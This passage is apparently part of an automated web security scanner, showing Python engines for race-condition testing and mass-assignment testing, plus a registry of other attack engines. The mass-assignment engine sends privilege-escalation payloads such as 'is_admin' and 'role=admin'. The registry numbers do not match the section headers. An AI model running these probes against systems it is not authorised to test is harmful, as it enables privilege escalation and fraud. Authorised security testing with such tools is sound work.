# ═══════════════════════════════════════════════════════════
# E11 — RACE CONDITION ENGINE
# ═══════════════════════════════════════════════════════════

class RaceConditionEngine(BaseEngine):
    async def run(self, params: dict) -> EngineResult:
        result = EngineResult()
        endpoint = params.get("endpoint", "")
        method = params.get("method", "POST")
        body = params.get("body", {})
        session_token = params.get("session_token")
        concurrent = params.get("concurrent", 20)

        self._log(f"Race condition test: {endpoint} ({concurrent} concurrent)")

        # Send concurrent requests
        tasks = [
            self.http.request(method, endpoint, json_body=body,
                              session_token=session_token, timeout=10)
            for _ in range(concurrent)
        ]

        responses = await asyncio.gather(*tasks, return_exceptions=True)

        # Analyze results
        success_count = 0
        statuses = []
        for resp in responses:
            if isinstance(resp, dict):
                status = resp.get("status", 0)
                statuses.append(status)
                if status in [200, 201]:
                    success_count += 1

        if success_count > 1:
            result.add_finding(
                vuln_type="RACE_CONDITION",
                severity="HIGH",
                endpoint=endpoint,
                method=method,
                description=f"Race condition: {success_count}/{concurrent} requests succeeded simultaneously",
                proof_req=f"{method} {endpoint} x{concurrent} concurrent",
                proof_resp=f"Status distribution: {dict(zip(*[iter(statuses)]*1))}",
                confidence=85,
                remediation="Use database-level locks, atomic operations, or idempotency keys. Implement TOCTOU protection."
            )

        result.info["success_count"] = success_count
        result.info["total_requests"] = concurrent
        result.info["status_distribution"] = {}
        for s in statuses:
            result.info["status_distribution"][s] = result.info["status_distribution"].get(s, 0) + 1

        result.success = True
        return result


# ═══════════════════════════════════════════════════════════
# E12 — MASS ASSIGNMENT ENGINE
# ═══════════════════════════════════════════════════════════

class MassAssignmentEngine(BaseEngine):
    SENSITIVE_FIELDS = [
        "role", "is_admin", "admin", "verified", "active", "balance",
        "credit", "permissions", "level", "status", "privileged",
        "is_superuser", "staff", "superadmin", "accountType", "userType",
        "subscription", "plan", "tier", "trusted", "approved"
    ]

    async def run(self, params: dict) -> EngineResult:
        result = EngineResult()
        endpoint = params.get("endpoint", "")
        method = params.get("method", "PUT")
        session_token = params.get("session_token")
        base_body = params.get("base_body", {})

        self._log(f"Mass assignment test: {endpoint}")

        # Get baseline
        baseline = await self.http.request("GET", endpoint, session_token=session_token)
        baseline_body = baseline.get("body", "") if baseline else ""

        for field in self.SENSITIVE_FIELDS:
            for value in ["admin", True, 1, "superadmin", "true"]:
                test_body = {**base_body, field: value}
                resp = await self.http.request(method, endpoint,
                                               json_body=test_body,
                                               session_token=session_token)

                if resp and resp.get("status") in [200, 201]:
                    body = resp.get("body", "")
                    # Check if field was accepted
                    if (str(value).lower() in body.lower() or
                            field in body.lower()):
                        result.add_finding(
                            vuln_type="MASS_ASSIGNMENT",
                            severity="CRITICAL",
                            endpoint=endpoint,
                            param=field,
                            method=method,
                            description=f"Mass assignment: field '{field}={value}' accepted by server",
                            proof_req=f"{method} {endpoint} body={{...{field}: {value}...}}",
                            proof_resp=body[:300],
                            confidence=85,
                            remediation="Use whitelist of allowed fields (allowlist-based mass assignment protection). Never use blacklisting."
                        )
                await asyncio.sleep(0.2)

        result.success = True
        return result


# ═══════════════════════════════════════════════════════════
# ENGINE REGISTRY
# ═══════════════════════════════════════════════════════════

ENGINE_REGISTRY = {
    "e01_recon": ReconEngine,
    "e02_discovery": EndpointDiscoveryEngine,
    "e12_idor_engine": IDOREngine,
    "e08_auth_bypass": AuthBypassEngine,
    "e09_jwt_engine": JWTEngine,
    "e10_otp_engine": OTPEngine,
    "e28_cors_engine": CORSEngine,
    "e20_injection_engine": SQLInjectionEngine,
    "e22_ssrf_engine": SSRFEngine,
    "e16_business_logic": BusinessLogicEngine,
    "e19_race_condition": RaceConditionEngine,
    "e15_mass_assignment": MassAssignmentEngine,
}


def get_engine(name: str, http_client, db, rules: dict, logger=None) -> Optional[BaseEngine]:
    cls = ENGINE_REGISTRY.get(name)
    if cls:
        return cls(http_client, db, rules, logger)
    return None
